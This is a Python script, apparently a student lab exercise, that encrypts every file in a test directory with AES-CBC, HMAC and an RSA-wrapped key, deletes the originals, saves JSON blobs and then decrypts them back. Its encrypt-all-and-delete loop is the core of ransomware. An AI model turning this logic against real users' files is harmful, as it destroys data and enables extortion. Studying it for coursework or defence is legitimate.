# -*- coding: utf-8 -*-
"""
Spyder Editor
"""
import time
import re
import os
import json
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, serialization, hashes, asymmetric, hmac
from cryptography.exceptions import InvalidSignature

directory = 'C:\\Users\\galla\\TestDirectory'
publicKeyPath = 'C:\\Users\\galla\\PrivPubKey\\Public_key1.pem'  
privateKeyPath = 'C:\\Users\\galla\\PrivPubKey\\Private_key1.pem'
os.chdir(directory) #change directory 

def myEncryptMAC(message, key, HMACKey):
    if (len(key) >= 32):                    #check if the length of the key is less than 32
        if (isinstance(message, bytes)):    #check if the message is in bytes 
            m = message 
        else:
            m = bytes(message, "utf-8")     #if messsage is not in bytes then convert
        
        padder = padding.PKCS7(128).padder()        #create padder instance 
        m = padder.update(m) + padder.finalize()    #generate padded data and concatenate it  
        
        iv = os.urandom(16)                     #generate 16 byte IV
        
        backend = default_backend()             #start backend instance to generate cipher
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)    #initialize algorithm to encrypt the message
        
        encryptor = cipher.encryptor()          #initialize encryptor
        ct = encryptor.update(m) + encryptor.finalize() #encrypt the message 
        
        h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())  #create hash alogrithm instance 
        h.update(ct)                    #hash the encrypted message 
        
        tag = h.finalize()      #create the tag by finalizing the HMAC algorithm
        
        return iv, ct, tag                           #return the iv, message, and tag 
    
    else: 
        print("Key size is less than 32 bytes. Retry.") 
    
def myDecrypt(C, iv, key, tag, HMACKey):     
    h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())  #create hash alogrithm instance 
    h.update(C)
    try:
        h.verify(tag)       #verify the tag has not been tampered with 
    
        backend = default_backend()                                            #initialize backend for decrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)   #initialize algorithm to encrypt the message
        
        decryptor = cipher.decryptor()                 #initialize decryptor
        m = decryptor.update(C) + decryptor.finalize() #decrypt the message
    
        unpadder = padding.PKCS7(128).unpadder()        #create unpadder instance 
        m = unpadder.update(m) + unpadder.finalize()    #unpad the message
        return m 
    except InvalidSignature:
        print("Wrong tag!")

def myFileEncryptMAC(filepath):
    key = os.urandom(32)        #generate 32 byte key for encryptor
    HMACKey = os.urandom(32)    #generate the HMACkey 
    
    fpath = filepath        #used to split filename and extension *this is only required if you want to create a new file
    filepath, ext = os.path.splitext(fpath) #get extension of file 
    
    with open(fpath, "rb") as F:               #convert file to string then to bytes 
        strF = base64.b64encode(F.read())
    
    iv, c, tag = myEncryptMAC(strF, key, HMACKey)  #encrypt string  
    
    with open(filepath, 'wb') as F:            #overwrite original File without an extension
        F.write(c)                          #write our encrypted file string into the file
        F.close()                               
        
    return c, iv, key, ext, HMACKey, tag

def myFileDecryptMAC(c, iv, key, filepath, ext, HMACKey, tag):   
    strFile = myDecrypt(c, iv, key, tag, HMACKey)      #decrypt file 
    
    finalFilePath = filepath + ext  #remove .json if it has it 
    finalFilePath = re.sub('.json', '', finalFilePath)
    
    with open(finalFilePath, 'wb') as unEncFile:             #bring back original file 
        unEncFile.write(base64.b64decode(strFile))      #convert decrypted data to original file type then write to the file        
        unEncFile.close()

def myRSAEncryptMAC(filepath, RSA_PublicKey_filepath):
    c, iv, key, ext, HMACKey, tag = myFileEncryptMAC(filepath)     #encrypt the file
    
    with open(RSA_PublicKey_filepath, "rb") as public_key_data:         #load public key data 
        public_key = serialization.load_pem_public_key(public_key_data.read(), backend=default_backend())  #serialize public key data
    
    final_Key = HMACKey + key                #concatenate the public key and HMACKey to get the final_key
    
    RSACipher = public_key.encrypt(final_Key,                 #use public key to encrypt the final_Key
                                   asymmetric.padding.OAEP(        #use OAEP padding 
                                           mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),     #use SHA256 
                                           algorithm=hashes.SHA256(),
                                           label=None
                                           )
                                  ) 
                                   
    return RSACipher, c, iv, ext, tag 
    
def myRSADecryptMAC(RSACipher, c, iv, filepath, ext, RSA_PrivateKey_filepath, tag):
    with open(RSA_PrivateKey_filepath, "rb") as private_key_data:     #load private key 
        private_key = serialization.load_pem_private_key(
                private_key_data.read(),
                password=None,
                backend=default_backend())
    
    final_Key = private_key.decrypt(RSACipher,        #decrypt the final_key using the private key
                              asymmetric.padding.OAEP(
                                      mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
                                      algorithm=hashes.SHA256(),
                                      label=None                 
                                      )
                              )
    
    HMACKey = final_Key[0:32]      #take first 32 bytes of the final_Key as your HMACKey
    key = final_Key[32:64]         #take the last 32 bytes of the final_Key as your key
    
    myFileDecryptMAC(c, iv, key, filepath, ext, HMACKey, tag)    #decrypt the file using decrypted key

#STEP 2 GENERATE KEYS
#def genKeys():
if (not(os.path.isfile('.\\PrivPubKey\\Private_key1.pem') and os.path.isfile('.\\PrivPubKey\\Public_key1.pem'))):
    if (not(os.path.isdir('.\\PrivPubKey'))):   #check if directory doesn't exist 
        os.mkdir("PrivPubKey")                  #create directory for keys
         
    private_key = rsa.generate_private_key(         #generate the private RSA key 
            public_exponent=65537,
            key_size=2048,
            backend=default_backend())

    filename = '.\\PrivPubKey\\Private_key1.pem'     #store RSA private key to a file 
    pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
    with open(filename, 'wb') as pem_out:
        pem_out.write(pem)

    public_key = private_key.public_key()           #generate the public RSA key 
    pem = public_key.public_bytes(
       encoding=serialization.Encoding.PEM,
       format=serialization.PublicFormat.SubjectPublicKeyInfo
       )
    
    filenamepub = '.\\PrivPubKey\\Public_key1.pem'   #store RSA public key to a file 
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
     )
    with open(filenamepub, 'wb') as pem_out:
        pem_out.write(pem)
     


#STEP 3 encrypt all files in the current directory 
#def encryptALL():

# Gather all of the files in a directory 
files = os.listdir()
if('PrivPubKey' in files):
    files.remove('PrivPubKey')
if('EncMACexec.exe' in files):
    files.remove('EncMACexec.exe')
print(files)

for file in files:
    RSACipher, c, iv, ext, tag = myRSAEncryptMAC(os.path.join(os.getcwd(),file), os.path.join(os.getcwd(), 'PrivPubKey\\Public_key1.pem')) #encrypt each file 
    
    fpath = os.path.join(os.getcwd(), file)        #used to split filename and extension *this is only required if you want to create a new file
    filepath, ext = os.path.splitext(fpath) #get extension of file 
    
    #create a json file for each encrypted file 
    #fileName = os.path.splitext(str(file))[0]   #get only the filename without the extension 
    jsonFile = {}      #empty json file list 
    jsonFile[filepath] = []    #each filepath is an array object  
    jsonFile[filepath].append(
            {"RSACipher" : RSACipher.decode('latin-1'),
             "c" : c.decode('latin-1'),
             "iv" : iv.decode('latin-1'),
             "ext" : ext,
             "tag" : tag.decode('latin-1')
             })  

    #jsonFile.update(jsonFile)
    fullpath = filepath + '.json'
    with open(fullpath, 'w') as file:       #save each json file individually 
        json.dump(jsonFile, file)
    os.remove(fpath)    #remove orignal file 
    os.remove(filepath) #remove file created by myRSAEncrypt 
print(os.getcwd())

#time.sleep(5)
#def decryptALL():
files = os.listdir(os.getcwd())
if('PrivPubKey' in files):
    files.remove('PrivPubKey')
print(files)
if('EncMACexec.exe' in files):
    files.remove('EncMACexec.exe')


for file in files:
    
    fpath = os.path.join(os.getcwd(), file) 
    filepath, ext = os.path.splitext(fpath) #get filepath without the extension  
    
    with open(fpath, 'r') as f:       #open and save data from json file into a readable variable  
        originalFile = json.load(f)
    
    #take values from the json file 
    RSACipher = bytes(originalFile[filepath][0]["RSACipher"], 'latin-1')
    c = bytes(originalFile[filepath][0]["c"], 'latin-1')
    iv = bytes(originalFile[filepath][0]["iv"], 'latin-1')
    ext = originalFile[filepath][0]["ext"]
    tag = bytes(originalFile[filepath][0]["tag"], 'latin-1')
    
    #decrypt file using previously taken values 
    myRSADecryptMAC(RSACipher, c, iv, fpath, ext, os.path.join(os.getcwd(), 'PrivPubKey\\Private_key1.pem'), tag) #encrypt each file 
    
    #remove the encrypted version
    os.remove(os.path.join(os.getcwd(), file))
    
print(os.getcwd())






#'C:\\Users\\galla\\TestDirectory\\face.jpg'    #image directory 
#'C:\\Users\\galla\\TestDirectory\\face'        #image directory after being encrypted 
#'C:\\Users\\galla\\PrivPubKey\\Public_key1.pem'    #RSApublic key directory 
#'C:\\Users\\galla\\PrivPubKey\\Private_key1.pem'   #RSAprivate key directory 
"""
save private and public key in pem files 
//PRIVATE
pk = private_key
filename = 'C:\\Users\\galla\\PrivPubKey\\Private_key1.pem'
pem = pk.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
with open(filename, 'wb') as pem_out:
    pem_out.write(pem)
//PUBLIC
filenamepub = 'C:\\Users\\galla\\PrivPubKey\\Public_key1.pem'
pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
 )
with open(filenamepub, 'wb') as pem_out:
    pem_out.write(pem)

Generate public and private keys    

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
backend=default_backend())

public_key = private_key.public_key()
pem = public_key.public_bytes(
   encoding=serialization.Encoding.PEM,
   format=serialization.PublicFormat.SubjectPublicKeyInfo
)
pem.splitlines()[0]

Out[92]: b'-----BEGIN PUBLIC KEY-----'
        
"""
        
        